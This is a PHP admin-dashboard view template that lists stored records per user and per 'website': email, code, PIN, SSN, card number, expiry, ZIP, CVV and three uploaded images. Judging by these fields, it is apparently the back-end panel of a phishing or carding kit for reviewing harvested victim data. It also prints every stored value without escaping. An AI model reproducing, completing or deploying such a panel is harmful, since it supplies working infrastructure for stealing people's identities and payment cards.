<?php
defined('BASEPATH') or exit('No direct script access allowed');
?>

<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><?php echo trans('informations'); ?></h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo site_url('admin/dashboard'); ?>"><?php echo trans('dashboard'); ?></a></li>
                        <li class="breadcrumb-item active"><?php echo trans('informations'); ?></li>
                    </ol>
                </div>
            </div>
        </div><!-- /.container-fluid -->
    </section>

    <!-- Main content -->
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <div class="card">
                        <div class="card-header">
                            <h3 class="card-title"><?php echo trans('informations'); ?></h3>
                        </div>
                        <!-- /.card-header -->
                        <div class="card-body table-responsive p-10">
                            <table class="table table-bordered">
                                <thead>
                                    <tr>
                                        <th><?php echo trans('id'); ?></th>
                                        <th><?php echo trans('user'); ?></th>
                                        <th><?php echo trans('website'); ?></th>
                                        <th><?php echo trans('email'); ?></th>
                                        <th><?php echo trans('code'); ?></th>
                                        <th><?php echo trans('pin'); ?></th>
                                        <th><?php echo trans('ssn'); ?></th>
                                        <th><?php echo trans('number'); ?></th>
                                        <th><?php echo trans('card_expire'); ?></th>
                                        <th><?php echo trans('zip'); ?></th>
                                        <th><?php echo trans('cvv'); ?></th>
                                        <th><?php echo trans('image_1'); ?></th>
                                        <th><?php echo trans('image_2'); ?></th>
                                        <th><?php echo trans('image_3'); ?></th>
                                        <th><?php echo trans('date'); ?></th>
                                        <?php if (is_root()) { ?>
                                            <th><?php echo trans('action'); ?></th>
                                        <?php }
                                        ?>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php

                                    foreach ($informations as $information) { ?>

                                        <tr>
                                            <td><?php echo $information->id; ?></td>
                                            <td>
                                                <?php
                                                if (get_user($information->user_id)) {
                                                    echo get_user($information->user_id)->username;
                                                } else {
                                                    echo trans('user_not_found');
                                                }
                                                ?>
                                            </td>
                                            <td>
                                                <?php
                                                if (get_website($information->website_id)) {
                                                    echo get_website($information->website_id)->website_name;
                                                } else {
                                                    echo trans('website_not_found');
                                                }
                                                ?>
                                            </td>
                                            <td><?php echo $information->email; ?></td>
                                            <td><?php echo $information->code; ?></td>
                                            <td><?php echo $information->pin; ?></td>
                                            <td><?php echo $information->ssn; ?></td>
                                            <td><?php echo $information->number; ?></td>
                                            <td><?php echo $information->card_date; ?></td>
                                            <td><?php echo $information->zip; ?></td>
                                            <td><?php echo $information->cvv; ?></td>
                                            <td>
                                                <img width="250px" src="<?php echo $information->image_1; ?>" alt="<?php echo trans('image_not_found'); ?>">
                                                <a href="<?php echo $information->image_1; ?>" target="_blank"><?php echo trans('view_image'); ?></a>
                                            </td>
                                            <td>
                                                <img width="250px" src="<?php echo $information->image_2; ?>" alt="<?php echo trans('image_not_found'); ?>">
                                                <a href="<?php echo $information->image_2; ?>" target="_blank"><?php echo trans('view_image'); ?></a>
                                            </td>
                                            <td>
                                                <img width="250px" src="<?php echo $information->image_3; ?>" alt="<?php echo trans('image_not_found'); ?>">
                                                <a href="<?php echo $information->image_3; ?>" target="_blank"><?php echo trans('view_image'); ?></a>
                                            </td>
                                            <td><?php echo date('d-m-Y h:i:s A', strtotime($information->date)); ?></td>
                                            <?php if (is_root()) { ?>
                                                <td>
                                                    <a href="#" onclick="delete_row('informations', '<?php echo urldecode($information->id); ?>')" class="btn btn-danger">
                                                        <i class="fas fa-trash"></i>
                                                    </a>
                                                </td>
                                            <?php }
                                            ?>
                                        </tr>
                                    <?php }

                                    ?>
                                </tbody>
                            </table>
                        </div>
                        <!-- /.card-body -->
                        <div class="card-footer clearfix">
                            <?php echo $links; ?>
                        </div>
                    </div>
                    <!-- /.card -->
                </div>
            </div>
            <!-- /.row -->

        </div><!-- /.container-fluid -->
    </section>
    <!-- /.content -->
</div>